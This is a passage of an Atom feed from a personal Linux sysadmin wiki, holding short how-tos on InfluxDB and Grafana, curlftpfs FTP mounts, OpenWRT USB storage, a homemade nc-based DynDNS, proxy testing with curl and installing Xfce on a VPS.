And &lt;a href="http://influxdb.com/" title="http://influxdb.com/"&gt;InfluxDB&lt;/a&gt; is the
assistant for the job (the database storing the metrics).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\# http://influxdb.com/docs/v0.8/introduction/installation.html  &lt;/span&gt;
&lt;span class="go"&gt;\$ wget http://s3.amazonaws.com …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Need a quick way to visualize statistics or custom metrics ?&lt;br&gt;
You like nice graphs - Kibana style ?&lt;/p&gt;
&lt;p&gt;&lt;a href="http://grafana.org/" title="http://grafana.org/"&gt;Grafana&lt;/a&gt; is the answer (the
presentation layer).&lt;br&gt;
And &lt;a href="http://influxdb.com/" title="http://influxdb.com/"&gt;InfluxDB&lt;/a&gt; is the
assistant for the job (the database storing the metrics).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\# http://influxdb.com/docs/v0.8/introduction/installation.html  &lt;/span&gt;
&lt;span class="go"&gt;\$ wget http://s3.amazonaws.com/influxdb/influxdb\_latest\_amd64.deb  &lt;/span&gt;
&lt;span class="go"&gt;\$ dpkg -i influxdb\_latest\_amd64.deb  &lt;/span&gt;
&lt;span class="go"&gt;\$ vi /opt/influxdb/versions/0.8.8/config.toml \# change parameters if&lt;/span&gt;
&lt;span class="go"&gt;needed  &lt;/span&gt;
&lt;span class="go"&gt;\$ /etc/init.d/influxdb start&lt;/span&gt;

&lt;span class="go"&gt;\# http://grafana.org/download/  &lt;/span&gt;
&lt;span class="go"&gt;\$ cd /var/www/ \# a working http server is needed  &lt;/span&gt;
&lt;span class="go"&gt;\$ wget http://grafanarel.s3.amazonaws.com/grafana-1.9.1.tar.gz  &lt;/span&gt;
&lt;span class="go"&gt;\$ tar -vxzf grafana-1.9.1.tar.gz  &lt;/span&gt;
&lt;span class="go"&gt;\$ cd grafana-1.9.1/  &lt;/span&gt;
&lt;span class="go"&gt;\$ cp config.sample.js config.js  &lt;/span&gt;
&lt;span class="go"&gt;\$ vi config.js \# uncomment the InfluxDB section and adapt it to your&lt;/span&gt;
&lt;span class="go"&gt;setup&lt;/span&gt;

&lt;span class="go"&gt;\# create the databases  &lt;/span&gt;
&lt;span class="go"&gt;\$ curl -s &amp;quot;http://localhost:8086/db?u=root&amp;amp;p=root&amp;quot; -d &amp;quot;{\\&amp;quot;name\\&amp;quot;:&lt;/span&gt;
&lt;span class="go"&gt;\\&amp;quot;grafana\\&amp;quot;}&amp;quot;  &lt;/span&gt;
&lt;span class="go"&gt;\$ curl -s &amp;quot;http://localhost:8086/db?u=root&amp;amp;p=root&amp;quot; -d &amp;quot;{\\&amp;quot;name\\&amp;quot;:&lt;/span&gt;
&lt;span class="go"&gt;\\&amp;quot;metrics\\&amp;quot;}&amp;quot;  &lt;/span&gt;
&lt;span class="go"&gt;\# put some data in  &lt;/span&gt;
&lt;span class="go"&gt;\$ curl -X POST -d&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;[{&amp;quot;name&amp;quot;:&amp;quot;random&amp;quot;,&amp;quot;columns&amp;quot;:[&amp;quot;value&amp;quot;],&amp;quot;points&amp;quot;:[[20]]}]&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;http://localhost:8086/db/metrics/series?u=root&amp;amp;p=root&amp;#39;  &lt;/span&gt;
&lt;span class="go"&gt;\$ curl -X POST -d&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;[{&amp;quot;name&amp;quot;:&amp;quot;random&amp;quot;,&amp;quot;columns&amp;quot;:[&amp;quot;value&amp;quot;],&amp;quot;points&amp;quot;:[[10]]}]&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;http://localhost:8086/db/metrics/series?u=root&amp;amp;p=root&amp;#39;  &lt;/span&gt;
&lt;span class="go"&gt;\$ curl -X POST -d&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;[{&amp;quot;name&amp;quot;:&amp;quot;random&amp;quot;,&amp;quot;columns&amp;quot;:[&amp;quot;value&amp;quot;],&amp;quot;points&amp;quot;:[[30]]}]&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;http://localhost:8086/db/metrics/series?u=root&amp;amp;p=root&amp;#39;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now open the Grafana url, edit the Graph and put "random" in the series
field - you should see a line having 3 points at 20, 10 and 30.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="http://www.philipotoole.com/influxdb-and-grafana-howto/" title="http://www.philipotoole.com/influxdb-and-grafana-howto/"&gt;http://www.philipotoole.com/influxdb-and-grafana-howto/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.kibinlabs.com/influxdb-continuous-queries-and-retention-policies/" title="http://www.kibinlabs.com/influxdb-continuous-queries-and-retention-policies/"&gt;http://www.kibinlabs.com/influxdb-continuous-queries-and-retention-policies/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.rittmanmead.com/2015/02/obiee-monitoring-and-diagnostics-with-influxdb-and-grafana/" title="http://www.rittmanmead.com/2015/02/obiee-monitoring-and-diagnostics-with-influxdb-and-grafana/"&gt;http://www.rittmanmead.com/2015/02/obiee-monitoring-and-diagnostics-with-influxdb-and-grafana/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="grafana"></category><category term="influxdb"></category><category term="metrics"></category><category term="monitoring"></category><category term="stats"></category><category term="Ubuntu"></category></entry><entry><title>FTPfs / mount remote FTP on local server with curlftpfs</title><link href="http://wiki.jokeru.ro/how-to-ftpfs-mount-remote-ftp-on-local-server-with-curlftpfs.html" rel="alternate"></link><published>2015-01-13T23:45:00+00:00</published><updated>2015-01-13T23:45:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2015-01-13:/how-to-ftpfs-mount-remote-ftp-on-local-server-with-curlftpfs.html</id><summary type="html">&lt;p&gt;So you're managing / maintaining (from the terminal) some FTP services
and you'd like to have a quick access to each and every one of them
without a login ?&lt;/p&gt;
&lt;p&gt;Here's how you do it:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\$ apt-get install curlftpfs  &lt;/span&gt;
&lt;span class="go"&gt;\$ mkdir /root/ftp1  &lt;/span&gt;
&lt;span class="go"&gt;\$ curlftpfs &amp;#39;ftp-username&amp;#39;:&amp;#39;ftp-password&amp;#39;@ftp-server /root/ftp1/  &lt;/span&gt;
&lt;span class="go"&gt;\$ cd /root/ftp1/ &amp;amp;&amp;amp; ls  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note …&lt;/p&gt;</summary><content type="html">&lt;p&gt;So you're managing / maintaining (from the terminal) some FTP services
and you'd like to have a quick access to each and every one of them
without a login ?&lt;/p&gt;
&lt;p&gt;Here's how you do it:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\$ apt-get install curlftpfs  &lt;/span&gt;
&lt;span class="go"&gt;\$ mkdir /root/ftp1  &lt;/span&gt;
&lt;span class="go"&gt;\$ curlftpfs &amp;#39;ftp-username&amp;#39;:&amp;#39;ftp-password&amp;#39;@ftp-server /root/ftp1/  &lt;/span&gt;
&lt;span class="go"&gt;\$ cd /root/ftp1/ &amp;amp;&amp;amp; ls  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note: if the user or password contains the '@' character, you should use
the following command:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\$ curlftpfs -o user=&amp;#39;ftp-username:ftp-password&amp;#39; ftp-server&lt;/span&gt;
&lt;span class="go"&gt;/root/ftp1/  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To make the changes permanent, you also need to:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;\$ echo &amp;#39;machine ftp-server&amp;#39; \&amp;gt; /root/.netrc  &lt;/span&gt;
&lt;span class="go"&gt;\$ echo &amp;#39;login ftp-username&amp;#39; \&amp;gt;\&amp;gt; /root/.netrc  &lt;/span&gt;
&lt;span class="go"&gt;\$ echo &amp;#39;password ftp-password&amp;#39; \&amp;gt;\&amp;gt; /root/.netrc  &lt;/span&gt;
&lt;span class="go"&gt;\$ chmod 0600 /root/.netrc  &lt;/span&gt;
&lt;span class="go"&gt;\$ echo &amp;#39;curlftpfs\#ftp-server /root/ftp1 fuse umask=0022 0 0&amp;#39; \&amp;gt;\&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;/etc/fstab  &lt;/span&gt;
&lt;span class="go"&gt;\$ mount -a  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="curlftpfs"></category><category term="filesystem"></category><category term="FTP"></category><category term="ftpfs"></category></entry><entry><title>OpenWRT USB Storage</title><link href="http://wiki.jokeru.ro/how-to-openwrt-usb-storage.html" rel="alternate"></link><published>2011-12-09T09:00:00+00:00</published><updated>2011-12-09T09:00:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-12-09:/how-to-openwrt-usb-storage.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; opkg update

&lt;span class="gp"&gt;$&lt;/span&gt; opkg install kmod-usb-core kmod-scsi-core kmod-usb-storage kmod-usb2 kmod-fs-ext2

&lt;span class="gp"&gt;$&lt;/span&gt; opkg install e2fsprogs
&lt;span class="gp"&gt;$&lt;/span&gt; dmesg &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;scsi&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; mkfs.ext2 /dev/scsi/host0/bus0/target0/lun0/part1

&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /backup-usb
&lt;span class="gp"&gt;$&lt;/span&gt; mount -t ext2 -o noatime /dev/scsi/host0/bus0/target0/lun0/part1 /backup-usb

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/init.d/usb-mount
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x /etc/init.d/usb-mount …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; opkg update

&lt;span class="gp"&gt;$&lt;/span&gt; opkg install kmod-usb-core kmod-scsi-core kmod-usb-storage kmod-usb2 kmod-fs-ext2

&lt;span class="gp"&gt;$&lt;/span&gt; opkg install e2fsprogs
&lt;span class="gp"&gt;$&lt;/span&gt; dmesg &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;scsi&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; mkfs.ext2 /dev/scsi/host0/bus0/target0/lun0/part1

&lt;span class="gp"&gt;$&lt;/span&gt; mkdir /backup-usb
&lt;span class="gp"&gt;$&lt;/span&gt; mount -t ext2 -o noatime /dev/scsi/host0/bus0/target0/lun0/part1 /backup-usb

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/init.d/usb-mount
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x /etc/init.d/usb-mount
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/usb-mount &lt;span class="nb"&gt;enable&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/init.d/usb-mount&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/sh /etc/rc.common
&lt;span class="go"&gt;START=80&lt;/span&gt;
&lt;span class="go"&gt;STOP=40&lt;/span&gt;

&lt;span class="go"&gt;start() {&lt;/span&gt;
&lt;span class="go"&gt; echo -n &amp;quot;Testing USB Partition: &amp;quot;&lt;/span&gt;
&lt;span class="go"&gt; e2fsck -p /dev/scsi/host0/bus0/target0/lun0/part1 &amp;amp;&lt;/span&gt;
&lt;span class="go"&gt; sleep 5&lt;/span&gt;
&lt;span class="go"&gt; echo -n &amp;quot;Mounting USB drive: &amp;quot;&lt;/span&gt;
&lt;span class="go"&gt; mount -t ext2 -o noatime /dev/scsi/host0/bus0/target0/lun0/part1 /backup-usb&lt;/span&gt;
&lt;span class="go"&gt; echo &amp;quot;Done.&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt; #&lt;/span&gt;/usr/bin/rsync --daemon
&lt;span class="go"&gt;}&lt;/span&gt;

&lt;span class="go"&gt;stop() {&lt;/span&gt;
&lt;span class="go"&gt; echo -n &amp;quot;UnMounting USB drive: &amp;quot;&lt;/span&gt;
&lt;span class="go"&gt; umount /dev/scsi/host0/bus0/target0/lun0/part1&lt;/span&gt;
&lt;span class="go"&gt; echo &amp;quot;Done.&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt; #&lt;/span&gt;/bin/kill -9 &lt;span class="sb"&gt;`&lt;/span&gt;cat /var/run/rsyncd.pid&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="gp"&gt; #&lt;/span&gt;/bin/rm /var/run/rsyncd.pid
&lt;span class="go"&gt;}&lt;/span&gt;

&lt;span class="go"&gt;restart() {&lt;/span&gt;
&lt;span class="go"&gt; stop&lt;/span&gt;
&lt;span class="go"&gt; start&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="backfire"></category><category term="backup"></category><category term="openwrt"></category><category term="rsync"></category><category term="usb"></category></entry><entry><title>HomeMade DynDNS</title><link href="http://wiki.jokeru.ro/how-to-homemade-dyndns.html" rel="alternate"></link><published>2011-12-04T01:01:00+00:00</published><updated>2011-12-04T01:01:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-12-04:/how-to-homemade-dyndns.html</id><summary type="html">&lt;p&gt;The solution is simple:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;on the server (10.20.30.40) hosting the DNS Server (bind) we'll create a listener (a nc infinite loop) that will update &amp;amp; reload the service when there is an IP change on the client&lt;/li&gt;
&lt;li&gt;on the client having dynamic IP we'll configure a cronjob that …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;The solution is simple:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;on the server (10.20.30.40) hosting the DNS Server (bind) we'll create a listener (a nc infinite loop) that will update &amp;amp; reload the service when there is an IP change on the client&lt;/li&gt;
&lt;li&gt;on the client having dynamic IP we'll configure a cronjob that will feed the listener with the current IP address&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;on Client (OpenWRT)&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /root/dyndns.sh
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/ash
&lt;span class="go"&gt;domain=&amp;#39;jokeru.ro&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;device=&amp;#39;openwrt&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;ip=$(ifconfig ppp0 | grep inet | awk &amp;#39;{print $2}&amp;#39; | cut -d&amp;#39;:&amp;#39; -f2)&lt;/span&gt;
&lt;span class="go"&gt;echo &amp;quot;$domain:$device:$ip&amp;quot; | nc 10.20.30.40 53053&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x /root/dyndns.sh
&lt;span class="gp"&gt;$&lt;/span&gt; crontab -e &lt;span class="c1"&gt;# add /root/dyndns.sh&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;on Server (Ubuntu)&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /etc/bind/jokeru/dyndns.sh
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/bash

&lt;span class="go"&gt;out=&amp;#39;/etc/bind/jokeru/dyndns&amp;#39;&lt;/span&gt;

&lt;span class="go"&gt;while :&lt;/span&gt;
&lt;span class="go"&gt;do&lt;/span&gt;
&lt;span class="go"&gt; in=$(nc -n -l -p 53053)&lt;/span&gt;
&lt;span class="go"&gt; domain=$(echo $in | cut -d&amp;#39;:&amp;#39; -f1)&lt;/span&gt;
&lt;span class="go"&gt; host=$(echo $in | cut -d&amp;#39;:&amp;#39; -f2)&lt;/span&gt;
&lt;span class="go"&gt; ip=$(echo $in | cut -d&amp;#39;:&amp;#39; -f3)&lt;/span&gt;
&lt;span class="go"&gt; if [ &amp;quot;$domain&amp;quot; == &amp;quot;jokeru.ro&amp;quot; ]&lt;/span&gt;
&lt;span class="go"&gt; then&lt;/span&gt;
&lt;span class="go"&gt;  new=&amp;quot;$host IN A $ip&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;  old=$(cat $out)&lt;/span&gt;
&lt;span class="go"&gt;  if [ &amp;quot;$new&amp;quot; != &amp;quot;$old&amp;quot; ]&lt;/span&gt;
&lt;span class="go"&gt;  then&lt;/span&gt;
&lt;span class="go"&gt;   /etc/init.d/bind9 reload&lt;/span&gt;
&lt;span class="go"&gt;   echo $new &amp;gt; $out&lt;/span&gt;
&lt;span class="go"&gt;  fi&lt;/span&gt;
&lt;span class="go"&gt; fi&lt;/span&gt;
&lt;span class="go"&gt;done&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x /etc/bind/jokeru/dyndns.sh
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/etc/bind/jokeru/dyndns.sh&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/rc.local
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/bind/jokeru/dyndns.sh &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="openwrt"></category><category term="ubuntu"></category><category term="dyndns"></category><category term="bash"></category><category term="nc"></category><category term="dns"></category><category term="bind"></category></entry><entry><title>Test Socks Proxy with cURL</title><link href="http://wiki.jokeru.ro/how-to-test-socks-proxy-with-curl.html" rel="alternate"></link><published>2011-07-16T00:40:00+01:00</published><updated>2011-07-16T00:40:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-07-16:/how-to-test-socks-proxy-with-curl.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl --interface &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40 --socks5 &lt;span class="m"&gt;11&lt;/span&gt;.22.33.44:30180 http://www.ceipam.ro/ &lt;span class="p"&gt;|&lt;/span&gt; grep title
&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl --interface &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40 --socks5 &lt;span class="m"&gt;11&lt;/span&gt;.22.33.44:30180 http://www.ceipam.ro/ &lt;span class="p"&gt;|&lt;/span&gt; grep title
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="bash"></category><category term="proxy"></category><category term="socks"></category><category term="curl"></category></entry><entry><title>Test WEB Proxy with cURL</title><link href="http://wiki.jokeru.ro/how-to-test-web-proxy-with-curl.html" rel="alternate"></link><published>2011-07-05T00:15:00+01:00</published><updated>2011-07-05T00:15:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-07-05:/how-to-test-web-proxy-with-curl.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl -Lv -U &lt;span class="s2"&gt;&amp;quot;username:password&amp;quot;&lt;/span&gt; -x &lt;span class="s2"&gt;&amp;quot;proxy_ip:proxy_port&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://google.com&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl -Lv -U &lt;span class="s2"&gt;&amp;quot;username:password&amp;quot;&lt;/span&gt; -x &lt;span class="s2"&gt;&amp;quot;proxy_ip:proxy_port&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://google.com&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="proxy"></category><category term="auth"></category><category term="curl"></category></entry><entry><title>Sort IP List in BASH</title><link href="http://wiki.jokeru.ro/how-to-sort-ip-list-in-bash.html" rel="alternate"></link><published>2011-06-30T12:30:00+01:00</published><updated>2011-06-30T12:30:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-06-30:/how-to-sort-ip-list-in-bash.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sort -t. -k1,1n -k2,2n -k3,3n -k4,4n ip-list
&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sort -t. -k1,1n -k2,2n -k3,3n -k4,4n ip-list
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="bash"></category><category term="scripting"></category></entry><entry><title>GUI Desktop (Xfce) on Ubuntu Server VPS</title><link href="http://wiki.jokeru.ro/how-to-gui-desktop-xfce-on-ubuntu-server-vps.html" rel="alternate"></link><published>2011-05-22T14:04:00+01:00</published><updated>2011-05-22T14:04:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-05-22:/how-to-gui-desktop-xfce-on-ubuntu-server-vps.html</id><summary type="html">&lt;p&gt;Install a graphical environment (X, GUI) &amp;amp; VNC server on your Linux VPS
server to connect to it from your computer and use it as a desktop computer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install xorg

&lt;span class="go"&gt;The following NEW packages will be installed:&lt;/span&gt;
&lt;span class="go"&gt;intel-gpu-tools libfs6 libgl1-mesa-dri libgl1-mesa-glx libglu1-mesa&lt;/span&gt;
&lt;span class="go"&gt;libpciaccess0 libxcursor1 libxdamage1 libxfixes3 libxi6 libxinerama1&lt;/span&gt;
&lt;span class="go"&gt;libxkbfile1 libxrandr2 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Install a graphical environment (X, GUI) &amp;amp; VNC server on your Linux VPS
server to connect to it from your computer and use it as a desktop computer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install xorg

&lt;span class="go"&gt;The following NEW packages will be installed:&lt;/span&gt;
&lt;span class="go"&gt;intel-gpu-tools libfs6 libgl1-mesa-dri libgl1-mesa-glx libglu1-mesa&lt;/span&gt;
&lt;span class="go"&gt;libpciaccess0 libxcursor1 libxdamage1 libxfixes3 libxi6 libxinerama1&lt;/span&gt;
&lt;span class="go"&gt;libxkbfile1 libxrandr2 libxtst6 libxv1 libxvmc1 libxxf86dga1 libxxf86vm1&lt;/span&gt;
&lt;span class="go"&gt;x11-apps x11-session-utils x11-utils x11-xfs-utils x11-xkb-utils&lt;/span&gt;
&lt;span class="go"&gt;x11-xserver-utils xbitmaps xfonts-100dpi xfonts-75dpi xfonts-base&lt;/span&gt;
&lt;span class="go"&gt;xfonts-scalable xinit xinput xorg xorg-docs-core xserver-common&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg xserver-xorg-core xserver-xorg-input-all&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-input-evdev xserver-xorg-input-mouse&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-input-synaptics xserver-xorg-input-vmmouse&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-input-wacom xserver-xorg-video-all xserver-xorg-video-apm&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-ark xserver-xorg-video-ati xserver-xorg-video-chips&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-cirrus xserver-xorg-video-fbdev&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-i128 xserver-xorg-video-intel&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-mach64 xserver-xorg-video-mga&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-neomagic xserver-xorg-video-nouveau&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-nv xserver-xorg-video-openchrome&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-r128 xserver-xorg-video-radeon&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-rendition xserver-xorg-video-s3&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-s3virge xserver-xorg-video-savage&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-siliconmotion xserver-xorg-video-sis&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-sisusb xserver-xorg-video-tdfx&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-trident xserver-xorg-video-tseng&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-v4l xserver-xorg-video-vesa xserver-xorg-video-vmware&lt;/span&gt;
&lt;span class="go"&gt;xserver-xorg-video-voodoo xterm&lt;/span&gt;
&lt;span class="go"&gt;0 upgraded, 74 newly installed, 0 to remove and 0 not upgraded.&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install xfce4

&lt;span class="go"&gt;The following NEW packages will be installed:&lt;/span&gt;
&lt;span class="go"&gt;aumix aumix-common consolekit dbus dbus-x11 desktop-base&lt;/span&gt;
&lt;span class="go"&gt;desktop-file-utils exo-utils fortune-mod fortunes-min gconf2&lt;/span&gt;
&lt;span class="go"&gt;gconf2-common ghostscript gnome-keyring gsfonts gstreamer0.10-alsa&lt;/span&gt;
&lt;span class="go"&gt;gstreamer0.10-plugins-base gtk2-engines-xfce gvfs gvfs-backends hal&lt;/span&gt;
&lt;span class="go"&gt;hal-info hicolor-icon-theme hunspell-en-us indicator-application&lt;/span&gt;
&lt;span class="go"&gt;libappindicator0 libarchive1 libatasmart4 libatk1.0-0 libatk1.0-data&lt;/span&gt;
&lt;span class="go"&gt;libavahi-client3 libavahi-common-data libavahi-common3 libavahi-glib1&lt;/span&gt;
&lt;span class="go"&gt;libbluetooth3 libcdio-cdda0 libcdio-paranoia0 libcdio10 libcdparanoia0&lt;/span&gt;
&lt;span class="go"&gt;libck-connector0 libcroco3 libcups2 libcupsimage2 libdbus-glib-1-2&lt;/span&gt;
&lt;span class="go"&gt;libdbusmenu-glib1 libdbusmenu-gtk1 libeggdbus-1-0 libenchant1c2a&lt;/span&gt;
&lt;span class="go"&gt;libexif12 libexo-0.3-0 libexo-common libffi5 libgconf2-4 libgcr0 libgdu0&lt;/span&gt;
&lt;span class="go"&gt;libglade2-0 libgnome-keyring0 libgp11-0 libgphoto2-2 libgphoto2-port0&lt;/span&gt;
&lt;span class="go"&gt;libgs8 libgsf-1-114 libgsf-1-common libgstreamer-plugins-base0.10-0&lt;/span&gt;
&lt;span class="go"&gt;libgstreamer0.10-0 libgtk2.0-0 libgtk2.0-bin libgtk2.0-common&lt;/span&gt;
&lt;span class="go"&gt;libgudev-1.0-0 libgvfscommon0 libhal-storage1 libhal1 libhunspell-1.2-0&lt;/span&gt;
&lt;span class="go"&gt;libidl0 libimobiledevice0 libindicator0 libjasper1 libjpeg-progs&lt;/span&gt;
&lt;span class="go"&gt;libjson-glib-1.0-0 liblcms1 libmagickcore2 libmagickwand2 libnotify1&lt;/span&gt;
&lt;span class="go"&gt;libntfs10 libogg0 liboil0.3 libopenobex1 liborbit2 libpam-ck-connector&lt;/span&gt;
&lt;span class="go"&gt;libpam-gnome-keyring libpaper-utils libpaper1 libplist1&lt;/span&gt;
&lt;span class="go"&gt;libpolkit-agent-1-0 libpolkit-backend-1-0 libpolkit-gobject-1-0&lt;/span&gt;
&lt;span class="go"&gt;libproxy0 librecode0 librsvg2-2 librsvg2-common libsexy2 libsgutils2-2&lt;/span&gt;
&lt;span class="go"&gt;libsmbclient libsoup-gnome2.4-1 libsoup2.4-1 libstartup-notification0&lt;/span&gt;
